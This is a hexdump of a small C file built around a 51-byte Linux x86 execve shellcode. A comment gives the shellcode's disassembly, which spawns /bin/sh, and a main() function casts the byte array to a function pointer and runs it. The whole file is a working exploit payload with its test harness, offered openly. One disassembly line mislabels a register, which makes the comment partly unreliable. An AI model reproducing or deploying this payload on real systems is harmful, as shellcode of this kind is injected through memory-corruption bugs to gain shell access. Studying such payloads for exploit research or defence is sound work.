00000000  2f 2a 0d 0a 2a 6c 69 6e  75 78 2f 78 38 36 20 65  |/*..*linux/x86 e|
00000010  78 65 63 76 65 28 29 35  31 62 79 74 65 73 0d 0a  |xecve()51bytes..|
00000020  2a 20 30 38 30 34 38 30  38 30 20 3c 5f 73 74 61  |* 08048080 <_sta|
00000030  72 74 3e 3a 0d 0a 2a 20  38 30 34 38 30 38 30 3a  |rt>:..* 8048080:|
00000040  20 65 62 20 31 61 20 6a  6d 70 20 38 30 34 38 30  | eb 1a jmp 80480|
00000050  39 63 0d 0a 2a 20 30 38  30 34 38 30 38 32 20 3a  |9c..* 08048082 :|
00000060  0d 0a 2a 20 38 30 34 38  30 38 32 3a 20 35 65 20  |..* 8048082: 5e |
00000070  70 6f 70 20 25 65 73 69  0d 0a 2a 20 38 30 34 38  |pop %esi..* 8048|
00000080  30 38 33 3a 20 33 31 20  63 30 20 78 6f 72 20 25  |083: 31 c0 xor %|
00000090  65 61 78 2c 25 65 61 78  0d 0a 2a 20 38 30 34 38  |eax,%eax..* 8048|
000000a0  30 38 35 3a 20 38 38 20  34 36 20 30 37 20 6d 6f  |085: 88 46 07 mo|
000000b0  76 20 25 61 6c 2c 30 78  37 28 25 65 73 69 29 0d  |v %al,0x7(%esi).|
000000c0  0a 2a 20 38 30 34 38 30  38 38 3a 20 38 64 20 31  |.* 8048088: 8d 1|
000000d0  65 20 6c 65 61 20 28 25  65 73 69 29 2c 25 65 62  |e lea (%esi),%eb|
000000e0  78 0d 0a 2a 20 38 30 34  38 30 38 61 3a 20 38 39  |x..* 804808a: 89|
000000f0  20 35 65 20 30 38 20 6d  6f 76 20 25 65 62 78 2c  | 5e 08 mov %ebx,|
00000100  30 78 38 28 25 65 73 69  29 0d 0a 2a 20 38 30 34  |0x8(%esi)..* 804|
00000110  38 30 38 64 3a 20 38 39  20 34 36 20 30 63 20 6d  |808d: 89 46 0c m|
00000120  6f 76 20 25 65 61 78 2c  30 78 63 28 25 65 73 69  |ov %eax,0xc(%esi|
00000130  29 0d 0a 2a 20 38 30 34  38 30 39 30 3a 20 62 30  |)..* 8048090: b0|
00000140  20 30 62 20 6d 6f 76 20  24 30 78 62 2c 25 61 6c  | 0b mov $0xb,%al|
00000150  0d 0a 2a 20 38 30 34 38  30 39 32 3a 20 38 39 20  |..* 8048092: 89 |
00000160  66 33 20 6d 6f 76 20 25  65 73 69 2c 25 65 62 78  |f3 mov %esi,%ebx|
00000170  0d 0a 2a 20 38 30 34 38  30 39 34 3a 20 38 64 20  |..* 8048094: 8d |
00000180  34 65 20 30 38 20 6c 65  61 20 30 78 38 28 25 65  |4e 08 lea 0x8(%e|
00000190  73 69 29 2c 25 65 63 78  0d 0a 2a 20 38 30 34 38  |si),%ecx..* 8048|
000001a0  30 39 37 3a 20 38 64 20  34 65 20 30 63 20 6c 65  |097: 8d 4e 0c le|
000001b0  61 20 30 78 63 28 25 65  73 69 29 2c 25 65 63 78  |a 0xc(%esi),%ecx|
000001c0  0d 0a 2a 20 38 30 34 38  30 39 61 3a 20 63 64 20  |..* 804809a: cd |
000001d0  38 30 20 69 6e 74 20 24  30 78 38 30 0d 0a 2a 20  |80 int $0x80..* |
000001e0  30 38 30 34 38 30 39 63  20 3a 0d 0a 2a 20 38 30  |0804809c :..* 80|
000001f0  34 38 30 39 63 3a 20 65  38 20 65 31 20 66 66 20  |4809c: e8 e1 ff |
00000200  66 66 20 66 66 20 63 61  6c 6c 20 38 30 34 38 30  |ff ff call 80480|
00000210  38 32 0d 0a 2a 20 38 30  34 38 30 61 31 3a 20 32  |82..* 80480a1: 2|
00000220  66 20 64 61 73 0d 0a 2a  20 38 30 34 38 30 61 32  |f das..* 80480a2|
00000230  3a 20 36 32 20 36 39 20  36 65 20 62 6f 75 6e 64  |: 62 69 6e bound|
00000240  20 25 65 62 70 2c 30 78  36 65 28 25 65 63 78 29  | %ebp,0x6e(%ecx)|
00000250  0d 0a 2a 20 38 30 34 38  30 61 35 3a 20 32 66 20  |..* 80480a5: 2f |
00000260  64 61 73 0d 0a 2a 20 38  30 34 38 30 61 36 3a 20  |das..* 80480a6: |
00000270  37 33 20 36 38 20 6a 61  65 20 38 30 34 38 31 31  |73 68 jae 804811|
00000280  30 0d 0a 2a 20 38 30 34  38 30 61 38 3a 20 34 61  |0..* 80480a8: 4a|
00000290  20 64 65 63 20 25 65 64  78 0d 0a 2a 20 38 30 34  | dec %edx..* 804|
000002a0  38 30 61 39 3a 20 34 31  20 69 6e 63 20 25 65 63  |80a9: 41 inc %ec|
000002b0  78 0d 0a 2a 20 38 30 34  38 30 61 61 3a 20 34 31  |x..* 80480aa: 41|
000002c0  20 69 6e 63 20 25 65 63  78 0d 0a 2a 20 38 30 34  | inc %ecx..* 804|
000002d0  38 30 61 62 3a 20 34 31  20 69 6e 63 20 25 65 63  |80ab: 41 inc %ec|
000002e0  78 0d 0a 2a 20 38 30 34  38 30 61 63 3a 20 34 31  |x..* 80480ac: 41|
000002f0  20 69 6e 63 20 25 65 63  78 0d 0a 2a 20 38 30 34  | inc %ecx..* 804|
00000300  38 30 61 64 3a 20 34 62  20 64 65 63 20 25 65 62  |80ad: 4b dec %eb|
00000310  78 0d 0a 2a 20 38 30 34  38 30 61 65 3a 20 34 62  |x..* 80480ae: 4b|
00000320  20 64 65 63 20 25 65 62  78 0d 0a 2a 20 38 30 34  | dec %ebx..* 804|
00000330  38 30 61 66 3a 20 34 62  20 64 65 63 20 25 65 62  |80af: 4b dec %eb|
00000340  78 0d 0a 2a 20 38 30 34  38 30 62 30 3a 20 34 62  |x..* 80480b0: 4b|
00000350  20 64 65 63 20 25 65 62  78 0d 0a 2a 2f 0d 0a 23  | dec %ebx..*/..#|
00000360  69 6e 63 6c 75 64 65 3c  73 74 64 69 6f 2e 68 3e  |include<stdio.h>|
00000370  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
00000380  5b 5d 3d 22 5c 78 65 62  5c 78 31 61 5c 78 35 65  |[]="\xeb\x1a\x5e|
00000390  5c 78 33 31 5c 78 63 30  5c 78 38 38 5c 78 34 36  |\x31\xc0\x88\x46|
000003a0  5c 78 30 37 5c 78 38 64  22 0d 0a 22 5c 78 31 65  |\x07\x8d".."\x1e|
000003b0  5c 78 38 39 5c 78 35 65  5c 78 30 38 5c 78 38 39  |\x89\x5e\x08\x89|
000003c0  5c 78 34 36 22 0d 0a 22  5c 78 30 63 5c 78 62 30  |\x46".."\x0c\xb0|
000003d0  5c 78 30 62 5c 78 38 39  5c 78 66 33 5c 78 38 64  |\x0b\x89\xf3\x8d|
000003e0  5c 78 34 65 5c 78 30 38  5c 78 38 64 5c 78 35 36  |\x4e\x08\x8d\x56|
000003f0  5c 78 30 63 5c 78 63 64  5c 78 38 30 5c 78 65 38  |\x0c\xcd\x80\xe8|
00000400  5c 78 65 31 22 0d 0a 22  5c 78 66 66 5c 78 66 66  |\xe1".."\xff\xff|
00000410  5c 78 66 66 5c 78 32 66  5c 78 36 32 5c 78 36 39  |\xff\x2f\x62\x69|
00000420  5c 78 36 65 5c 78 32 66  5c 78 37 33 5c 78 36 38  |\x6e\x2f\x73\x68|
00000430  5c 78 34 61 5c 78 34 31  5c 78 34 31 5c 78 34 31  |\x4a\x41\x41\x41|
00000440  5c 78 34 31 22 0d 0a 22  5c 78 34 62 5c 78 34 62  |\x41".."\x4b\x4b|
00000450  5c 78 34 62 5c 78 34 62  22 3b 0d 0a 6d 61 69 6e  |\x4b\x4b";..main|
00000460  28 29 0d 0a 7b 20 76 6f  69 64 20 28 2a 72 6f 75  |()..{ void (*rou|
00000470  74 69 6e 65 29 28 29 3b  0d 0a 72 6f 75 74 69 6e  |tine)();..routin|
00000480  65 3d 26 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 70  |e=&shellcode;..p|
00000490  72 69 6e 74 66 28 22 73  69 7a 65 20 6f 66 20 73  |rintf("size of s|
000004a0  68 65 6c 6c 63 6f 64 65  3a 20 25 64 62 79 74 65  |hellcode: %dbyte|
000004b0  73 5c 6e 22 2c 73 69 7a  65 6f 66 28 73 68 65 6c  |s\n",sizeof(shel|
000004c0  6c 63 6f 64 65 29 29 3b  0d 0a 72 6f 75 74 69 6e  |lcode));..routin|
000004d0  65 28 29 3b 0d 0a 7d                              |e();..}|
000004d7
